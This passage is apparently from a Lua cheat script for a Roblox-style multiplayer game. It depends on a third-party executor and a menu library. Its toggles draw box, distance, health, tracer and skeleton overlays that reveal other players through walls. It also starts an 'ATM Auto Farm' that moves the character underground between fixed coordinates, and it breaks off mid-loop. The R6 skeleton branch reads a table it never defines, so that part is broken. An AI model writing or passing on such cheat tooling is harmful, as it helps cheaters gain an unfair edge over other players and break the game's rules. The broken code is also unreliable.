    topFrame.Size = UDim2.new(1, 0, 0, 2)
    topFrame.Position = UDim2.new(0, 0, 0, 0)

    local bottomFrame = Instance.new("Frame", frame)
    bottomFrame.BorderSizePixel = 1
    bottomFrame.Size = UDim2.new(1, 0, 0, 2)
    bottomFrame.Position = UDim2.new(0, 0, 1, -2)

    local leftFrame = Instance.new("Frame", frame)
    leftFrame.BorderSizePixel = 1
    leftFrame.Size = UDim2.new(0, 2, 1, 0)
    leftFrame.Position = UDim2.new(0, 0, 0, 0)

    local rightFrame = Instance.new("Frame", frame)
    rightFrame.BorderSizePixel = 1
    rightFrame.Size = UDim2.new(0, 2, 1, 0)
    rightFrame.Position = UDim2.new(1, -2, 0, 0)

    -- Coroutine to update ESP boxes
    coroutine.wrap(function()
        while wait(0.1) do
            if playerCharacter and playerCharacter.Character and playerCharacter.Character:FindFirstChild("Humanoid") and (playerCharacter.Character.Humanoid.Health > 0) then
                billboardGui.Adornee = playerCharacter.Character.HumanoidRootPart

                if config.ESP.Box.Box then
                    frame.Visible = true
                else
                    frame.Visible = false
                end

                if config.ESP.Box.TeamCheck and (playerCharacter.TeamColor == Players.LocalPlayer.TeamColor) then
                    billboardGui.Enabled = false
                else
                    billboardGui.Enabled = isToggleOn
                end

                local color = config.ESP.Box.BoxColor
                if config.ESP.Box.TeamColor then
                    color = playerCharacter.TeamColor.Color
                end

                topFrame.BackgroundColor3 = color
                bottomFrame.BackgroundColor3 = color
                leftFrame.BackgroundColor3 = color
                rightFrame.BackgroundColor3 = color
                frame.BackgroundColor3 = color
            else
                billboardGui.Enabled = false
                billboardGui.Adornee = nil
                frame.Visible = false
            end

            if not Players:FindFirstChild(playerCharacter.Name) then
                billboardGui:Destroy()
                return
            end
        end
    end)()
end


EspsSection:addToggle({
    title = "Box ESP",  -- Title of the toggle
    default = false,    -- Default value (off)
    callback = function(value)
        isToggleOn = value
        -- Update all existing ESPs based on the new toggle state
        for _, player in ipairs(Players:GetPlayers()) do
            if player.Character then
                local billboardGui = player.Character:FindFirstChild(player.Name .. "_BoxESP")
                if billboardGui then
                    billboardGui.Enabled = isToggleOn and (not config.ESP.Box.TeamCheck or player.TeamColor ~= Players.LocalPlayer.TeamColor)
                    billboardGui:FindFirstChild("Frame").Visible = isToggleOn
                end
            end
        end
    end
})


-- Connect player events
Players.PlayerAdded:Connect(function(playerCharacter)
    playerCharacter.CharacterAdded:Connect(function()
        createBoxESP(playerCharacter)
    end)
end)

-- Handle existing players
for _, playerCharacter in ipairs(Players:GetPlayers()) do
    if playerCharacter.Character then
        createBoxESP(playerCharacter)
    end
end














-- Dependencies
local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local RunService = game:GetService("RunService")

-- Get the local player and the camera
local localPlayer = Players.LocalPlayer
local currentCamera = Workspace.CurrentCamera

-- Variable to keep track of Distance ESP toggle state
local distanceESPEnabled = false

-- Container for BillboardGui objects
local distanceDisplays = {}

-- Function to calculate distance from the camera to a part
local function getDistanceFromCamera(part)
    return (part.Position - currentCamera.CFrame.Position).Magnitude
end

-- Function to create and display the BillboardGui
local function createDistanceDisplay(player)
    local character = player.Character
    if not character then return end

    local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
    if not humanoidRootPart then return end

    -- Create the BillboardGui
    local billboardGui = Instance.new("BillboardGui")
    billboardGui.Name = player.Name .. "_DistanceDisplay"
    billboardGui.Parent = humanoidRootPart
    billboardGui.Size = UDim2.new(0, 60, 0, 50) -- Size of the BillboardGui
    billboardGui.Adornee = humanoidRootPart
    billboardGui.AlwaysOnTop = true
    billboardGui.StudsOffset = Vector3.new(3, 0, 0) -- Position to the right of the player
    billboardGui.ClipsDescendants = true

    -- Create the TextLabel
    local textLabel = Instance.new("TextLabel")
    textLabel.Parent = billboardGui
    textLabel.Size = UDim2.new(1, 0, 1, 0)
    textLabel.BackgroundTransparency = 1
    textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    textLabel.TextStrokeTransparency = 0.5
    textLabel.TextScaled = true
    textLabel.Text = "Distance: 0 "

    -- Update the distance display
    local function updateDistance()
        local distance = math.floor(getDistanceFromCamera(humanoidRootPart))
        textLabel.Text = string.format("Distance: %d ", distance)
    end

    -- Connect to RenderStepped to update the distance
    local renderConnection
    renderConnection = RunService.RenderStepped:Connect(function()
        if not player.Character or not player.Character:FindFirstChild("HumanoidRootPart") then
            billboardGui:Destroy()
            if renderConnection then
                renderConnection:Disconnect()
            end
        else
            updateDistance()
        end
    end)

    -- Store the billboardGui in the distanceDisplays table
    distanceDisplays[player] = billboardGui
end

-- Function to handle player addition
local function onPlayerAdded(player)
    if distanceESPEnabled and player.Character then
        createDistanceDisplay(player)
    end
    player.CharacterAdded:Connect(function()
        if distanceESPEnabled then
            createDistanceDisplay(player)
        end
    end)
end

-- Function to handle player removal
local function onPlayerRemoving(player)
    if distanceDisplays[player] then
        distanceDisplays[player]:Destroy()
        distanceDisplays[player] = nil
    end
end

-- Toggle functionality
local function toggleDistanceESP(shouldEnable)
    if shouldEnable == distanceESPEnabled then return end

    -- Turn off Distance ESP
    if not shouldEnable then
        for _, display in pairs(distanceDisplays) do
            display:Destroy()
        end
        distanceDisplays = {}
        distanceESPEnabled = false
    else
        -- Turn on Distance ESP
        for _, player in ipairs(Players:GetPlayers()) do
            if player ~= localPlayer then
                local character = player.Character
                if character then
                    createDistanceDisplay(player)
                end
            end
        end

        -- Start listening for new players
        Players.PlayerAdded:Connect(onPlayerAdded)
        Players.PlayerRemoving:Connect(onPlayerRemoving)

        distanceESPEnabled = true
    end
end

EspsSection:addToggle({
    title = "Distance Esp",  -- Title of the toggle
    default = false,         -- Default value (off)
    callback = function(value)
        toggleDistanceESP(value)
    end
})











-- Services
local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")

-- Configuration for Health ESP
local config = {
    ESP = {
        Health = {
            Enabled = false,  -- Start with health ESP disabled
            Position = UDim2.new(0, 0, 1, 0),  -- Position on the left side of the player
            Size = UDim2.new(0.04, 0, 1, 0),      -- Width and height of the health bar
            BackgroundColor = Color3.fromRGB(40, 40, 40),
            BarColor = Color3.fromRGB(94, 255, 69),
        }
    }
}

-- Toggle state variable
local healthESPEnabled = config.ESP.Health.Enabled

-- Toggle function
local function onToggleChanged(value)
    healthESPEnabled = value
    -- Update all existing health bars based on new toggle state
    for _, playerCharacter in ipairs(Players:GetPlayers()) do
        if playerCharacter.Character and playerCharacter.Character:FindFirstChild("HumanoidRootPart") then
            local existingESP = Workspace.CurrentCamera:FindFirstChild(playerCharacter.Name .. "_HealthBarESP")
            if existingESP then
                existingESP.Enabled = healthESPEnabled
            end
        end
    end
end

-- Create and update Health Bar ESP
local function createHealthBarESP(playerCharacter)
    -- Create ESP GUI elements
    local billboardGui = Instance.new("BillboardGui")
    billboardGui.Parent = Workspace.CurrentCamera
    billboardGui.Name = playerCharacter.Name .. "_HealthBarESP"
    billboardGui.AlwaysOnTop = true
    billboardGui.Size = UDim2.new(4.5, 0, 6, 0)
    billboardGui.ClipsDescendants = false
    billboardGui.Enabled = healthESPEnabled

    local healthBarContainer = Instance.new("Frame", billboardGui)
    healthBarContainer.Name = "HealthBarContainer"
    healthBarContainer.Size = config.ESP.Health.Size
    healthBarContainer.Position = config.ESP.Health.Position
    healthBarContainer.BackgroundColor3 = config.ESP.Health.BackgroundColor
    healthBarContainer.BorderSizePixel = 0

    local healthBar = Instance.new("Frame", healthBarContainer)
    healthBar.Name = "HealthBar"
    healthBar.Size = UDim2.new(0.8, 0, 0.8, 0)
    healthBar.BackgroundColor3 = config.ESP.Health.BarColor
    healthBar.BorderSizePixel = 0
    healthBar.AnchorPoint = Vector2.new(0, 1)
    healthBar.Position = UDim2.new(0, 0, 0, 0)

    -- Coroutine to update Health Bar
    local coroutineTask = coroutine.create(function()
        while wait(0.1) do
            if (playerCharacter ~= Players.LocalPlayer) and playerCharacter and playerCharacter.Character and playerCharacter.Character:FindFirstChild("Humanoid") and (playerCharacter.Character.Humanoid.Health > 0) then
                billboardGui.Adornee = playerCharacter.Character.HumanoidRootPart

                -- Update health bar
                local humanoid = playerCharacter.Character:FindFirstChild("Humanoid")
                if humanoid then
                    local healthRatio = humanoid.Health / humanoid.MaxHealth
                    healthBar.Size = UDim2.new(1, 0, healthRatio, 0)
                end

                -- Update health bar visibility
                billboardGui.Enabled = healthESPEnabled

                if not Players:FindFirstChild(playerCharacter.Name) then
                    billboardGui:Destroy()
                    coroutine.yield()
                end
            else
                billboardGui.Enabled = false
                billboardGui.Adornee = nil
            end
        end
    end)

    coroutine.resume(coroutineTask)
end

-- Connect player events
Players.PlayerAdded:Connect(function(playerCharacter)
    playerCharacter.CharacterAdded:Connect(function()
        createHealthBarESP(playerCharacter)
    end)
end)

-- Handle existing players
for _, playerCharacter in ipairs(Players:GetPlayers()) do
    if playerCharacter.Character then
        createHealthBarESP(playerCharacter)
    end
end

EspsSection:addToggle({
    title = "Health Esp",  -- Title of the toggle
    default = false,       -- Default value (off)
    callback = onToggleChanged,  -- Function to call when the toggle state changes
})














-- Check for Orion Library
local function API_Check()
    return Drawing == nil and "No" or "Yes"
end

local Find_Required = API_Check()

if Find_Required == "No" then
    OrionLib:MakeNotification({
        Name = "Exunys Developer",
        Content = "Tracer script could not be loaded because your exploit is unsupported.",
        Time = math.huge
    })
    return
end

-- Services
local RunService = game:GetService("RunService")
local Players = game:GetService("Players")
local Camera = game:GetService("Workspace").CurrentCamera
local UserInputService = game:GetService("UserInputService")

-- Settings
_G.SendNotifications = false
_G.DefaultSettings = false
_G.TeamCheck = false
_G.FromMouse = false
_G.FromCenter = false
_G.FromBottom = true
_G.TracersVisible = true
_G.TracerColor = Color3.fromRGB(255, 255, 255)
_G.TracerThickness = 1
_G.TracerTransparency = 0.7
_G.ModeSkipKey = Enum.KeyCode.E
_G.DisableKey = Enum.KeyCode.Q

-- Define a variable to track the toggle state
local TracersEnabled = true

local function CreateTracers()
    local function UpdateTracer(v)
        local TracerLine = Drawing.new("Line")
        RunService.RenderStepped:Connect(function()
            local character = workspace:FindFirstChild(v.Name)
            if character and character:FindFirstChild("HumanoidRootPart") then
                local HumanoidRootPart_Position, HumanoidRootPart_Size = character.HumanoidRootPart.CFrame, character.HumanoidRootPart.Size * 1
                local Vector, OnScreen = Camera:WorldToViewportPoint(HumanoidRootPart_Position * CFrame.new(0, -HumanoidRootPart_Size.Y, 0).p)

                TracerLine.Thickness = _G.TracerThickness
                TracerLine.Transparency = _G.TracerTransparency
                TracerLine.Color = _G.TracerColor

                if _G.FromMouse and not _G.FromCenter and not _G.FromBottom then
                    TracerLine.From = Vector2.new(UserInputService:GetMouseLocation().X, UserInputService:GetMouseLocation().Y)
                elseif _G.FromCenter and not _G.FromMouse and not _G.FromBottom then
                    TracerLine.From = Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y / 2)
                elseif _G.FromBottom and not _G.FromMouse and not _G.FromCenter then
                    TracerLine.From = Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y)
                end

                if OnScreen then
                    TracerLine.To = Vector2.new(Vector.X, Vector.Y)
                    if _G.TeamCheck then
                        TracerLine.Visible = Players.LocalPlayer.Team ~= v.Team and _G.TracersVisible and TracersEnabled
                    else
                        TracerLine.Visible = _G.TracersVisible and TracersEnabled
                    end
                else
                    TracerLine.Visible = false
                end
            else
                TracerLine.Visible = false
            end
        end)

        Players.PlayerRemoving:Connect(function()
            TracerLine.Visible = false
        end)
    end

    for _, v in pairs(Players:GetPlayers()) do
        if v.Name ~= Players.LocalPlayer.Name then
            UpdateTracer(v)
        end
    end

    Players.PlayerAdded:Connect(function(Player)
        Player.CharacterAdded:Connect(function()
            if Player.Name ~= Players.LocalPlayer.Name then
                UpdateTracer(Player)
            end
        end)
    end)
end

UserInputService.TextBoxFocused:Connect(function()
    Typing = true
end)

UserInputService.TextBoxFocusReleased:Connect(function()
    Typing = false
end)

UserInputService.InputBegan:Connect(function(Input)
    if Input.KeyCode == _G.ModeSkipKey and not Typing then
        if _G.FromMouse and not _G.FromCenter and not _G.FromBottom then
            _G.FromCenter = false
            _G.FromBottom = true
            _G.FromMouse = false
            if _G.SendNotifications then
                OrionLib:MakeNotification({
                    Name = "Notification",
                    Content = "Tracers will be now coming from the bottom of your screen (Mode 1)",
                    Time = 5
                })
            end
        elseif _G.FromCenter and not _G.FromMouse and not _G.FromBottom then
            _G.FromCenter = false
            _G.FromBottom = false
            _G.FromMouse = true
            if _G.SendNotifications then
                OrionLib:MakeNotification({
                    Name = "Notification",
                    Content = "Tracers will be now coming from the position of your mouse cursor on your screen (Mode 3)",
                    Time = 5
                })
            end
        elseif _G.FromBottom and not _G.FromCenter and not _G.FromMouse then
            _G.FromCenter = true
            _G.FromBottom = false
            _G.FromMouse = false
            if _G.SendNotifications then
                OrionLib:MakeNotification({
                    Name = "Notification",
                    Content = "Tracers will be now coming from the center of your screen (Mode 2)",
                    Time = 5
                })
            end
        end
    elseif Input.KeyCode == _G.DisableKey and not Typing then
        _G.TracersVisible = not _G.TracersVisible
        if _G.SendNotifications then
            OrionLib:MakeNotification({
                Name = "Notification",
                Content = "The tracers' visibility is now set to " .. tostring(_G.TracersVisible) .. ".",
                Time = 5
            })
        end
    end
end)

if _G.DefaultSettings then
    _G.TeamCheck = true
    _G.FromMouse = false
    _G.FromCenter = false
    _G.FromBottom = true
    _G.TracersVisible = true
    _G.TracerColor = Color3.fromRGB(255, 255, 255)
    _G.TracerThickness = 1
    _G.TracerTransparency = 0.5
    _G.ModeSkipKey = Enum.KeyCode.E
    _G.DisableKey = Enum.KeyCode.Q
end

local Success, Errored = pcall(CreateTracers)

if Success and not Errored then
    if _G.SendNotifications then
        OrionLib:MakeNotification({
            Name = "Notification",
            Content = "Tracer script has successfully loaded.",
            Time = 5
        })
    end
elseif Errored then
    if _G.SendNotifications then
        OrionLib:MakeNotification({
            Name = "Notification",
            Content = "Tracer script has errored while loading, please check the developer console! (F9)",
            Time = 5
        })
    end
    warn(Errored)
end


EspsSection:addToggle({
    title = "Tracers Esp",  -- Title of the toggle
    default = false,       -- Default value (off)
    callback = function(value)
        TracersEnabled = value
        if _G.SendNotifications then
            OrionLib:MakeNotification({
                Name = "Notification",
                Content = "Tracers have been " .. (value and "enabled" or "disabled") .. ".",
                Time = 5
            })
        end
    end
})















-- Services
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local Camera = workspace.CurrentCamera

-- Player and Mouse
local Player = Players.LocalPlayer
local Mouse = Player:GetMouse()

-- Globals
local ESPEnabled = false
local ESPConnections = {}
local ESPLines = {}

-- Utility function to create a drawing line
local function DrawLine()
    local line = Drawing.new("Line")
    line.Visible = false
    line.From = Vector2.new(0, 0)
    line.To = Vector2.new(1, 1)
    line.Color = Color3.fromRGB(255, 255, 255)
    line.Thickness = 1
    line.Transparency = 1
    return line
end

-- Function to create ESP for a player
local function DrawESP(plr)
    repeat wait() until plr.Character and plr.Character:FindFirstChild("Humanoid")
    
    local limbs = {}
    local isR15 = (plr.Character.Humanoid.RigType == Enum.HumanoidRigType.R15)

    -- Define limb lines
    local function InitializeLimbLines()
        if isR15 then
            return {
                -- Spine
                Head_UpperTorso = DrawLine(),
                UpperTorso_LowerTorso = DrawLine(),
                -- Left Arm
                UpperTorso_LeftUpperArm = DrawLine(),
                LeftUpperArm_LeftLowerArm = DrawLine(),
                LeftLowerArm_LeftHand = DrawLine(),
                -- Right Arm
                UpperTorso_RightUpperArm = DrawLine(),
                RightUpperArm_RightLowerArm = DrawLine(),
                RightLowerArm_RightHand = DrawLine(),
                -- Left Leg
                LowerTorso_LeftUpperLeg = DrawLine(),
                LeftUpperLeg_LeftLowerLeg = DrawLine(),
                LeftLowerLeg_LeftFoot = DrawLine(),
                -- Right Leg
                LowerTorso_RightUpperLeg = DrawLine(),
                RightUpperLeg_RightLowerLeg = DrawLine(),
                RightLowerLeg_RightFoot = DrawLine(),
            }
        else
            return {
                Head_Spine = DrawLine(),
                Spine = DrawLine(),
                LeftArm = DrawLine(),
                LeftArm_UpperTorso = DrawLine(),
                RightArm = DrawLine(),
                RightArm_UpperTorso = DrawLine(),
                LeftLeg = DrawLine(),
                LeftLeg_LowerTorso = DrawLine(),
                RightLeg = DrawLine(),
                RightLeg_LowerTorso = DrawLine()
            }
        end
    end

    limbs = InitializeLimbLines()
    ESPLines[plr] = limbs

    local function SetVisibility(state)
        for _, line in pairs(limbs) do
            line.Visible = state
        end
    end

    local function UpdateLinesR15()
        return RunService.RenderStepped:Connect(function()
            if not ESPEnabled or not plr.Character or not plr.Character:FindFirstChild("Humanoid") or not plr.Character:FindFirstChild("HumanoidRootPart") or plr.Character.Humanoid.Health <= 0 then
                SetVisibility(false)
                return
            end

            local HUM, vis = Camera:WorldToViewportPoint(plr.Character.HumanoidRootPart.Position)
            if not vis then
                SetVisibility(false)
                return
            end

            -- Define limb positions
            local positions = {}
            for _, partName in ipairs({
                "Head", "UpperTorso", "LowerTorso",
                "LeftUpperArm", "LeftLowerArm", "LeftHand",
                "RightUpperArm", "RightLowerArm", "RightHand",
                "LeftUpperLeg", "LeftLowerLeg", "LeftFoot",
                "RightUpperLeg", "RightLowerLeg", "RightFoot"
            }) do
                positions[partName] = Camera:WorldToViewportPoint(plr.Character:FindFirstChild(partName).Position)
            end

            -- Update limb lines
            limbs.Head_UpperTorso.From = Vector2.new(positions.Head.X, positions.Head.Y)
            limbs.Head_UpperTorso.To = Vector2.new(positions.UpperTorso.X, positions.UpperTorso.Y)

            limbs.UpperTorso_LowerTorso.From = Vector2.new(positions.UpperTorso.X, positions.UpperTorso.Y)
            limbs.UpperTorso_LowerTorso.To = Vector2.new(positions.LowerTorso.X, positions.LowerTorso.Y)

            limbs.UpperTorso_LeftUpperArm.From = Vector2.new(positions.UpperTorso.X, positions.UpperTorso.Y)
            limbs.UpperTorso_LeftUpperArm.To = Vector2.new(positions.LeftUpperArm.X, positions.LeftUpperArm.Y)

            limbs.LeftUpperArm_LeftLowerArm.From = Vector2.new(positions.LeftUpperArm.X, positions.LeftUpperArm.Y)
            limbs.LeftUpperArm_LeftLowerArm.To = Vector2.new(positions.LeftLowerArm.X, positions.LeftLowerArm.Y)

            limbs.LeftLowerArm_LeftHand.From = Vector2.new(positions.LeftLowerArm.X, positions.LeftLowerArm.Y)
            limbs.LeftLowerArm_LeftHand.To = Vector2.new(positions.LeftHand.X, positions.LeftHand.Y)

            limbs.UpperTorso_RightUpperArm.From = Vector2.new(positions.UpperTorso.X, positions.UpperTorso.Y)
            limbs.UpperTorso_RightUpperArm.To = Vector2.new(positions.RightUpperArm.X, positions.RightUpperArm.Y)

            limbs.RightUpperArm_RightLowerArm.From = Vector2.new(positions.RightUpperArm.X, positions.RightUpperArm.Y)
            limbs.RightUpperArm_RightLowerArm.To = Vector2.new(positions.RightLowerArm.X, positions.RightLowerArm.Y)

            limbs.RightLowerArm_RightHand.From = Vector2.new(positions.RightLowerArm.X, positions.RightLowerArm.Y)
            limbs.RightLowerArm_RightHand.To = Vector2.new(positions.RightHand.X, positions.RightHand.Y)

            limbs.LowerTorso_LeftUpperLeg.From = Vector2.new(positions.LowerTorso.X, positions.LowerTorso.Y)
            limbs.LowerTorso_LeftUpperLeg.To = Vector2.new(positions.LeftUpperLeg.X, positions.LeftUpperLeg.Y)

            limbs.LeftUpperLeg_LeftLowerLeg.From = Vector2.new(positions.LeftUpperLeg.X, positions.LeftUpperLeg.Y)
            limbs.LeftUpperLeg_LeftLowerLeg.To = Vector2.new(positions.LeftLowerLeg.X, positions.LeftLowerLeg.Y)

            limbs.LeftLowerLeg_LeftFoot.From = Vector2.new(positions.LeftLowerLeg.X, positions.LeftLowerLeg.Y)
            limbs.LeftLowerLeg_LeftFoot.To = Vector2.new(positions.LeftFoot.X, positions.LeftFoot.Y)

            limbs.LowerTorso_RightUpperLeg.From = Vector2.new(positions.LowerTorso.X, positions.LowerTorso.Y)
            limbs.LowerTorso_RightUpperLeg.To = Vector2.new(positions.RightUpperLeg.X, positions.RightUpperLeg.Y)

            limbs.RightUpperLeg_RightLowerLeg.From = Vector2.new(positions.RightUpperLeg.X, positions.RightUpperLeg.Y)
            limbs.RightUpperLeg_RightLowerLeg.To = Vector2.new(positions.RightLowerLeg.X, positions.RightLowerLeg.Y)

            limbs.RightLowerLeg_RightFoot.From = Vector2.new(positions.RightLowerLeg.X, positions.RightLowerLeg.Y)
            limbs.RightLowerLeg_RightFoot.To = Vector2.new(positions.RightFoot.X, positions.RightFoot.Y)

            SetVisibility(true)
        end)
    end

    local function UpdateLinesR6()
        return RunService.RenderStepped:Connect(function()
            if not ESPEnabled or not plr.Character or not plr.Character:FindFirstChild("Humanoid") or not plr.Character:FindFirstChild("HumanoidRootPart") or plr.Character.Humanoid.Health <= 0 then
                SetVisibility(false)
                return
            end

            local HUM, vis = Camera:WorldToViewportPoint(plr.Character.HumanoidRootPart.Position)
            if not vis then
                SetVisibility(false)
                return
            end

            local T = Camera:WorldToViewportPoint(plr.Character.Torso.Position)
            local T_Height = plr.Character.Torso.Size.Y/2 - 0.2
            local UT = Camera:WorldToViewportPoint((plr.Character.Torso.CFrame * CFrame.new(0, T_Height, 0)).p)
            local LT = Camera:WorldToViewportPoint((plr.Character.Torso.CFrame * CFrame.new(0, -T_Height, 0)).p)

            local LA_Height = plr.Character["Left Arm"].Size.Y/2 - 0.2
            local LUA = Camera:WorldToViewportPoint((plr.Character["Left Arm"].CFrame * CFrame.new(0, LA_Height, 0)).p)
            local LLA = Camera:WorldToViewportPoint((plr.Character["Left Arm"].CFrame * CFrame.new(0, -LA_Height, 0)).p)

            local RA_Height = plr.Character["Right Arm"].Size.Y/2 - 0.2
            local RUA = Camera:WorldToViewportPoint((plr.Character["Right Arm"].CFrame * CFrame.new(0, RA_Height, 0)).p)
            local RLA = Camera:WorldToViewportPoint((plr.Character["Right Arm"].CFrame * CFrame.new(0, -RA_Height, 0)).p)

            local LL_Height = plr.Character["Left Leg"].Size.Y/2 - 0.2
            local LUL = Camera:WorldToViewportPoint((plr.Character["Left Leg"].CFrame * CFrame.new(0, LL_Height, 0)).p)
            local LLL = Camera:WorldToViewportPoint((plr.Character["Left Leg"].CFrame * CFrame.new(0, -LL_Height, 0)).p)

            local RL_Height = plr.Character["Right Leg"].Size.Y/2 - 0.2
            local RUL = Camera:WorldToViewportPoint((plr.Character["Right Leg"].CFrame * CFrame.new(0, RL_Height, 0)).p)
            local RLL = Camera:WorldToViewportPoint((plr.Character["Right Leg"].CFrame * CFrame.new(0, -RL_Height, 0)).p)

            -- Update limb lines
            limbs.Head_Spine.From = Vector2.new(positions.Head.X, positions.Head.Y)
            limbs.Head_Spine.To = Vector2.new(positions.UpperTorso.X, positions.UpperTorso.Y)

            limbs.Spine.From = Vector2.new(positions.UpperTorso.X, positions.UpperTorso.Y)
            limbs.Spine.To = Vector2.new(positions.LowerTorso.X, positions.LowerTorso.Y)

            limbs.LeftArm.From = Vector2.new(positions.LeftUpperArm.X, positions.LeftUpperArm.Y)
            limbs.LeftArm.To = Vector2.new(positions.LeftLowerArm.X, positions.LeftLowerArm.Y)

            limbs.LeftArm_UpperTorso.From = Vector2.new(positions.UpperTorso.X, positions.UpperTorso.Y)
            limbs.LeftArm_UpperTorso.To = Vector2.new(positions.LeftUpperArm.X, positions.LeftUpperArm.Y)

            limbs.RightArm.From = Vector2.new(positions.RightUpperArm.X, positions.RightUpperArm.Y)
            limbs.RightArm.To = Vector2.new(positions.RightLowerArm.X, positions.RightLowerArm.Y)

            limbs.RightArm_UpperTorso.From = Vector2.new(positions.UpperTorso.X, positions.UpperTorso.Y)
            limbs.RightArm_UpperTorso.To = Vector2.new(positions.RightUpperArm.X, positions.RightUpperArm.Y)

            limbs.LeftLeg.From = Vector2.new(positions.LeftUpperLeg.X, positions.LeftUpperLeg.Y)
            limbs.LeftLeg.To = Vector2.new(positions.LeftLowerLeg.X, positions.LeftLowerLeg.Y)

            limbs.LeftLeg_LowerTorso.From = Vector2.new(positions.LowerTorso.X, positions.LowerTorso.Y)
            limbs.LeftLeg_LowerTorso.To = Vector2.new(positions.LeftUpperLeg.X, positions.LeftUpperLeg.Y)

            limbs.RightLeg.From = Vector2.new(positions.RightUpperLeg.X, positions.RightUpperLeg.Y)
            limbs.RightLeg.To = Vector2.new(positions.RightLowerLeg.X, positions.RightLowerLeg.Y)

            limbs.RightLeg_LowerTorso.From = Vector2.new(positions.LowerTorso.X, positions.LowerTorso.Y)
            limbs.RightLeg_LowerTorso.To = Vector2.new(positions.RightUpperLeg.X, positions.RightUpperLeg.Y)

            SetVisibility(true)
        end)
    end

    local connection
    if isR15 then
        connection = UpdateLinesR15()
    else
        connection = UpdateLinesR6()
    end

    ESPConnections[plr] = connection
end

-- Function to handle player joining
local function onPlayerAdded(newplr)
    if newplr ~= Player then
        DrawESP(newplr)
    end
end

-- Function to handle player leaving
local function onPlayerRemoving(plr)
    if ESPConnections[plr] then
        ESPConnections[plr]:Disconnect()
        ESPConnections[plr] = nil
        ESPLines[plr] = nil
    end
end

-- Initial setup
for _, v in pairs(Players:GetPlayers()) do
    if v ~= Player then
        DrawESP(v)
    end
end

Players.PlayerAdded:Connect(onPlayerAdded)
Players.PlayerRemoving:Connect(onPlayerRemoving)

-- Toggle ESP function
function ToggleESP(state)
    ESPEnabled = state

    -- Disconnect existing connections and clear lines if disabling ESP
    if not state then
        for _, connection in pairs(ESPConnections) do
            connection:Disconnect()
        end
        ESPConnections = {}
        
        for _, lines in pairs(ESPLines) do
            for _, line in pairs(lines) do
                line.Visible = false
            end
        end
        ESPLines = {}
    else
        -- Re-enable ESP and recreate lines
        for _, player in pairs(Players:GetPlayers()) do
            if player ~= Player then
                DrawESP(player)
            end
        end
    end
end

EspsSection:addToggle({
    title = "Skeleton Esp",  -- Title of the toggle
    default = false,         -- Default value (off)
    callback = function(value)
        ToggleESP(value)
    end
})










local AutoFarmPage = UI:addPage({
    title = "AutoFarm",  -- Title of the page
    icon = 1234567890     -- Asset ID for the page icon (optional)
})





local ATMAutoFarmSection = AutoFarmPage:addSection({
    title = "ATM Auto Farm" -- Title of the section
})






-- Importing necessary services
local TweenService = game:GetService("TweenService")
local Players = game:GetService("Players")

-- Provided CFrames for destinations
local storeCFrame = CFrame.new(
    -455.536682, 24.7214737, -687.226135, 0.876918554, 3.13342667e-08, 0.480638951, -2.77348455e-08, 1, -1.45911274e-08, -0.480638951, -5.35217148e-10, 0.876918554
)

local atmCFrames = {
    CFrame.new(-487.234985, 23.5106659, 443.568207, -0.999979198, -5.70977718e-08, -0.00645062281, -5.67480356e-08, 1, -5.44004273e-08, 0.00645062281, -5.40332366e-08, -0.999979198),
    CFrame.new(-373.058441, 23.7106667, 152.555481, -0.0523415469, 3.93065207e-08, -0.998629212, 7.02295644e-09, 1, 3.89923791e-08, 0.998629212, -4.97240826e-09, -0.0523415469),
    CFrame.new(-585.008362, 23.4106693, -407.933228, 0.999987304, 3.31979022e-09, 0.00503399037, -3.18748739e-09, 1, -2.62899285e-08, -0.00503399037, 2.62735504e-08, 0.999987304),
    CFrame.new(-967.635864, 23.704155, 830.456543, -0.997961044, -9.30583699e-09, 0.0638261139, -6.73221168e-09, 1, 4.05375218e-08, -0.0638261139, 4.00251743e-08, -0.997961044),
    CFrame.new(-1018.83417, 23.8458786, 442.709198, -0.991912425, 1.11027113e-07, 0.126924261, 1.04882979e-07, 1, -5.50910251e-08, -0.126924261, -4.13332764e-08, -0.991912425),
    CFrame.new(997.054443, 3.66067648, -24.243906, -0.996836483, -5.71199843e-09, -0.0794795305, -2.2830704e-09, 1, -4.32331468e-08, 0.0794795305, -4.29149232e-08, -0.996836483),
    CFrame.new(1116.06946, 3.66068506, 372.264221, 0.0631054267, 9.48825303e-08, -0.99800688, 3.07471781e-09, 1, 9.52664436e-08, 0.99800688, -9.08041908e-09, 0.0631054267),
    CFrame.new(2486.40308, -11.9173231, -1738.61816, 0.999716699, -6.19399954e-09, 0.0238016658, 3.82558785e-09, 1, 9.955167e-08, -0.0238016658, -9.94324125e-08, 0.999716699),
    CFrame.new(2614.15723, -11.9173908, -2099.10449, 0.999586463, -4.06346246e-08, 0.0287568029, 4.17840411e-08, 1, -3.93694037e-08, -0.0287568029, 4.05546992e-08, 0.999586463),
    CFrame.new(2562.21167, -11.917448, -2238.40405, 0.032482598, 9.06827893e-08, -0.99947232, 9.15809539e-10, 1, 9.07604303e-08, 0.99947232, -3.86346066e-09, 0.032482598)
}

-- Fixed tween time
local tweenTime = 10  -- Duration in seconds
local undergroundOffset = Vector3.new(0, -10, 0)  -- Adjust this value based on your map's height

-- Variables to manage the state
local isActive = false
local stopAtNext = false
local currentIndex = 1

-- Teleport function with tween effect
local function teleportWithTween(character, destinations, tweenTime)
    local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
    if not humanoidRootPart then
        warn("HumanoidRootPart not found in character")
        return
    end

    -- Create a coroutine to handle sequential tweening
    coroutine.wrap(function()
        while isActive do
            -- Get the current ATM CFrame
            local atmCFrame = destinations[currentIndex]

            -- Go to ATM and then return to store
            local sequence = {
                storeCFrame,  -- Go to store
                atmCFrame,    -- Go to ATM
                storeCFrame   -- Return to store
            }
            
            for _, targetCFrame in ipairs(sequence) do
                -- Define underground CFrame
                local undergroundCFrame = targetCFrame * CFrame.new(undergroundOffset)

                -- Tween to the underground position
                local tweenInfo = TweenInfo.new(
                    tweenTime,  -- Duration in seconds
                    Enum.EasingStyle.Linear,  -- Easing style
                    Enum.EasingDirection.InOut  -- Easing direction
                )

                local tweenGoal = {CFrame = undergroundCFrame}
                local tween = TweenService:Create(humanoidRootPart, tweenInfo, tweenGoal)
                tween:Play()
                tween.Completed:Wait()

